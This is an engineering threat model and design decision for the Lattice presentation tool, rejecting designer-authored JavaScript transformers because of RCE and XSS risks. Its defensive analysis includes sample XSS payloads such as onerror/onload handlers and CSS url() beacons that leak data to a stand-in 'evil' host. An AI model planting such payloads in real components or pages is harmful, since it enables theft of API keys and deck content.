---
status: shipped
summary: Lattice components run first-party JS transformers (`lib/transformers/*`, `*.transform.js` — `applyToHtml`/`applyToDom`) with FULL power on every render path, including Node during PDF/PPTX export and the browser during preview. The question this doc answers: when designers author their own components, can they write and use custom JS transformers too? DECISION — no. Designer-authored components stay declarative (CSS + markdown skeleton today); the "magic" designers want is delivered through a safe, first-party-INTERPRETED declarative transform DSL, never arbitrary user JS. Reason: components are SHAREABLE (library + `lattice-asset` zip import) and AI-GENERABLE, so a user JS transformer is untrusted code that would run as RCE on whoever exports a deck (Node) and as XSS — incl. theft of the OpenRouter key in localStorage — on whoever previews it (the preview is a same-origin, UN-sandboxed `srcdoc` iframe that reads `parent.localStorage`). A real isolate for the Node export path is the kind of security problem that is never quite done; the declarative architecture (palette-blind CSS, `var(--token)`, skeleton markdown) already points the other way. Arbitrary JS transformers remain a FIRST-PARTY-ONLY capability. CAVEAT (red-team of this doc): "declarative" is not "inert" today — a shared/AI component's markdown skeleton renders with `html:true` into that un-sandboxed frame (raw-HTML XSS) and the CSS gate blocks only scope/hex, not `@import`/`url()` exfil — so sanitizing skeleton HTML + hardening the CSS gate (#616) are PRECONDITIONS of "declarative is safe to import/generate", not separate cleanup; zip-slip on future filesystem imports is #617. This doc is the gate: any future "let designers transform" build goes through the DSL; reopening user JS requires the six conditions in §7.1.
---

# Threat model — designer-authored component transformers

## 1. The question

> "components in lattice can have js do some magic. the question is when authoring
> components can we have designers create and use js transformers too?"

Lattice components run **transformers** — JS that rewrites the rendered structure
(`lib/transformers/*` + per-component `*.transform.js`). Today those are written
by the Lattice team. The question is whether a *designer* authoring a custom
component in the Component Studio should be able to write and ship their own JS
transformer. This doc is the gate that any such build must pass; the original
Studio-AI track flagged it as **must land before any transformer build**.

## 2. How transformers actually run (the thing we'd be opening up)

A transformer module is (see `lib/transformers/registry.js`):

```
module.exports = {
  name: 'chart-family',
  selector: 'section.progress, …',
  applyToHtml(html, ctx) { … },   // full rendered HTML string in → rewritten HTML out
  applyToDom(root, ctx)  { … },   // optional live-DOM walk
};
```

This is **arbitrary JavaScript with full ambient authority**, and the registry is
consumed by **every render path**:

- **the engine** (`lib/engine`) — runs in **Node** in the emulator (`lattice-emulator.js`),
  i.e. during **PDF / PPTX export**;
- **the runtime** (`lib/runtime`) — runs in the **browser** during live preview;
- the docs-site Studio preview renders engine output into a **`srcdoc` iframe with
  NO `sandbox` attribute** (`DeckPreview` → `single-slide-render.ts:222`), into which
  the runtime `<script>` is *deliberately* injected (`:143`). With no `sandbox` the
  frame inherits the **parent origin** and can read `parent.localStorage` — so it is
  an iframe, but not an isolating one. (Sandboxing it would break that intentional
  same-origin script injection, so the fix is non-trivial — see §8 / #616.)

So a transformer is not a pure data→data mapping in a box. In Node it has the
Node runtime (fs, network, `process`); in the browser it has the document, the
origin, and `localStorage`.

## 3. What changed — why this is being asked now

Two shifts moved component content across the trust boundary:

- **Components are shareable.** The Component Studio saves to a library and exports
  a portable `.lattice-component.zip` (`asset-bundle.ts`); decks and components
  import from other people. Today that zip is `manifest.json + <slug>.css +
  <slug>.skeleton.md` — **declarative, no executable code** — so importing is safe.
- **Components are AI-generable.** The Studio AI now generates deck/theme content
  (and component content is the obvious next step). A prompt-injected model can be
  steered to emit whatever the format allows.

Both make "the component you render" potentially **authored by someone other than
you** (a sharer, or the model). The moment a component can carry JS, "render a
component" becomes "execute a stranger's code on my machine."

## 3.1 The trust boundary today (it is clean — keep it that way)

| | Author | Carries | Crosses share/AI boundary as |
|---|---|---|---|
| **First-party transformer** (`lib/transformers/*`) | Lattice team | arbitrary JS | trusted code, shipped in the engine |
| **Designer component** (Component Studio) | the user | CSS (gated for *scope* only) + markdown skeleton | **declarative data** — but *not inert today* (see below) |

The clean line we want is: **executable JS is first-party-only; everything that
crosses the boundary is declarative.** The question is whether to erase that line by
adding user JS.

**But declarative ≠ inert as the code stands today**, and the red-team of this doc
proved it: the skeleton is *markdown rendered with `html: true`* and the CSS gate
checks only scoping — so the "safe to import / safe to generate" half of that row is
**not true yet**. Two holes are live *without any transformer change* (§5.1), and
closing them is a **precondition** of the decision in §6, not separate cleanup. The
transformer question (erase the line with JS?) and these preconditions (make the
declarative side actually inert) are distinct, and both must be answered.

## 4. Assets we are protecting

1. **The export host machine** — fs, network, env (an exporter may be a different
   person than the component author).
2. **The OpenRouter API key** — stored in `localStorage` (`lattice-db-or-key`),
   readable by any same-origin script in the preview/Studio.
3. **Deck content & its confidentiality** — boardroom decks; the on-device tiers
   exist precisely so content needn't leave the device.
4. **The docs-site / app origin integrity** — XSS there pivots to all of the above.

## 5. Threats if designers can author JS transformers

- **T1 — Remote code execution on the export host (Node).** A shared or AI-generated
  component's `applyToHtml`/`applyToDom` runs in `lattice-emulator.js` during PDF/PPTX
  export. That is arbitrary Node: read `~/.ssh`, POST it out, drop a file. The victim
  is *whoever exports a deck that uses the component*, not its author. **Critical.**
- **T2 — XSS / credential theft in the browser preview.** The same transformer runs
  in the same-origin preview DOM; it can read `localStorage` (the OpenRouter key),
  exfiltrate the open deck, or rewrite the page. **Critical.**
- **T3 — Untrusted-code supply chain.** The component library + zip import is a
  distribution channel; one popular malicious component fans out to every importer.
  AI generation is a second channel (prompt injection → a transformer with a payload).
- **T4 — Denial of service.** Even a *non-malicious* transformer can hang the export
  or the preview tab — an accidental infinite loop, or catastrophic-backtracking
  regex (ReDoS) over deck text. This bites even a "sandboxed" design and even the
  author themselves.
- **T5 — Idempotence / correctness blast radius.** The registry already requires
  every transformer to be safe to run twice; arbitrary user code that violates this
  corrupts the render non-deterministically across the three paths. Not a security
  bug, but it widens the "shared component breaks my deck" surface.

### 5.1 Already exploitable TODAY — the preconditions (no transformer change needed)

The trust-boundary shift in §3 makes two *existing* surfaces exploitable with the
current declarative-only components. These are **not** "adjacent, track-later" items:
they are the reason the §6 decision's safety claim is conditional, and they are the
same severity as T2.

- **T-CONTENT — raw-HTML XSS via a shared/AI skeleton.** The component skeleton is
  markdown (`asset-bundle.ts`), rendered through the engine with **`html: true`**
  (`lib/engine/index.js:132`) and **no downstream sanitizer**, into the same-origin,
  un-sandboxed `srcdoc` frame (§2). A shared or AI-generated skeleton with
  `<img src=x onerror=…>` / `<svg onload=…>` therefore **executes in the app origin
  on import/preview and can read the OpenRouter key** — with zero transformer. This is
  T2's impact, reachable now. Tracked: **#616**.
- **T-CSS — exfiltration via designer CSS.** `gateCss` (`layout-core.generated.js`)
  enforces only three things: non-empty, no hex literals, selector scoped to `.name`.
  It does **not** block `@import`, `url(...)`, legacy `expression()`, `-moz-binding`,
  or `javascript:`. So shared designer CSS is a live exfiltration channel — a
  `background:url(//evil/?leak)` beacon, or attribute-leak selectors
  (`[value^="a"]{background:url(//evil/a)}`) — defeating the on-device confidentiality
  goal (Asset #3) with no script at all. Tracked: **#616**.

## 6. Decision

**No designer-authored JS transformers.** Components remain **declarative**
(CSS + skeleton today). The expressive "magic" designers want is delivered through
a **safe, first-party-interpreted declarative transform DSL** — a curated, bounded
vocabulary the engine evaluates itself, with **no `eval`, no host access, no
ambient authority**. Arbitrary JS transformers stay a **first-party-only**
capability (`lib/transformers/*`, reviewed, shipped in the engine).

This keeps the boundary in §3.1 from being *erased* by user JS. But declarative is
only **safe to import/generate once the §5.1 preconditions are closed** — raw HTML in
skeletons sanitized/escaped on the shared+AI paths, and the CSS gate hardened against
beacon vectors (both #616). Declarative-only is the *necessary* posture; the two
preconditions make it *sufficient*. Shipping designer-component *sharing* or
*AI-generation* without them would ship T-CONTENT / T-CSS, so they gate that work the
same way this doc gates user JS.

### 6.1 What the declarative DSL covers (sketch, not a spec)

The engine already performs declarative transforms safely (split, section
matching, token resolution). A designer-facing DSL exposes a *curated* subset as
data the engine interprets — for example:

- **bind** a value/attribute to `var(--token)` (the universal token system already
  resolves these; `lib/core/resolve-token-expr.js` is a **pure** evaluator);
- **repeat** a fragment over the slide's list items;
- **conditional marker class** on a `<section>` from a declared predicate over the
  slide's own structure (has-image, n-items, has-eyebrow);
- **computed token expressions** (`color-mix` / `light-dark` / arithmetic) via the
  existing pure resolver, never a general expression language.

Each primitive must be **total and bounded** (no unbounded loops, no I/O). This is a
design *constraint the DSL spec must prove*, not a property of this sketch — `repeat`
over items plus `conditional` predicates is exactly where quadratic/unbounded
evaluation can creep in; the evaluator inherits the engine's `render-guard` timeout
(§8) as the backstop. When designers hit a wall, the answer is to **add a first-party
primitive** — reviewed once, safe for everyone — not to hand out `eval`.

## 7. Why not the alternatives

- **Sandboxed user JS.** A true sandbox on the **Node export path** is the hard part:
  `vm` is explicitly *not* a security boundary, so this needs a real isolate
  (QuickJS-WASM, `isolated-vm`, or a subprocess) plus a curated capability API and a
  CPU/memory budget — a large, permanent, escape-prone surface for a docs-site/desktop
  tool. Any single escape is T1. Rejected as default; revisit only under §7.1.
- **Local-only JS (stripped on share/import).** Avoids untrusted execution, but the
  JS *doesn't travel*, which guts the point of shareable components, and an
  AI-generated transformer still runs on its author. A sharp "your magic vanished on
  export" cliff. Held as a possible future power-user hatch, not the recommendation.
- **Signed / trusted components.** A trust-root + signing pipeline is heavy infra and
  a poor fit; it manages, rather than removes, untrusted execution.

### 7.1 Conditions to ever reopen user JS

If designer JS is revisited, it must ship with **all** of: (a) a real isolate for the
Node export path (not `vm`), proven against escape; (b) JS **stripped on share/import**
so it never crosses the trust boundary unreviewed; (c) a hard CPU/memory/time budget
(T4); (d) an explicit, per-deck consent prompt before executing a foreign component's
code; (e) a security review of the capability API; (f) the §5.1 content/CSS
preconditions (#616) closed first — a JS isolate is moot while raw-HTML and CSS
`url()` beacons remain open in the same-origin frame. Absent all six: declarative only.

## 8. Adjacent surfaces (related, but not part of this decision)

The §5.1 content/CSS holes are **preconditions** (above, #616), not "adjacent". What
*is* genuinely adjacent:

- **The preview-frame fix is non-trivial.** The remediation for T-CONTENT is *not*
  "wrap it in an iframe" — it already is one (`single-slide-render.ts:222`). The fix
  is to **add a `sandbox` attribute (dropping `allow-same-origin`)** on the
  untrusted-content path — which **breaks the deliberate same-origin runtime-`<script>`
  injection** the trusted self-authored preview relies on. So #616 likely needs a
  *split*: a trusted self-authored preview (today's same-origin frame) vs an untrusted
  (shared/AI) preview that is sandboxed and/or HTML-sanitized.
- **Zip-slip / path traversal on import.** Not exploitable on today's web import
  (`asset-bundle.ts` reads entries by manifest name into the asset store, no disk write
  by path), but the manifest's `css`/`skeleton` **path** fields are attacker-controlled,
  so any future filesystem-backed import (the Tauri desktop wrapper, a CLI) inherits a
  path-traversal vector — validate entry names (reject `..`, absolute, drive letters)
  before resolving. Tracked: **#617**.
- **DoS budget.** The render pipeline has a `render-guard` timeout; ensure the
  declarative DSL evaluator inherits a hard budget so a pathological declared
  expression can't hang export/preview (T4).

## 9. Scope & links

- Transformer architecture: `lib/transformers/registry.js`, `engineering/architecture.md`,
  `engineering/decisions/2026-05-17-shared-transformer-registry.md`.
- Component authoring + sharing: `docs/src/components/studio/LayoutStudio.tsx`,
  `component-library.ts`, `asset-bundle.ts` (#607, #608).
- Token resolver reused by the DSL: `lib/core/resolve-token-expr.js`,
  `engineering/decisions/2026-06-11-universal-token-system.md`.
- This decision **gates** any designer-transform feature; it does not itself build
  the DSL. The DSL is a future slice that starts from §6.1 and inherits §8's budget.
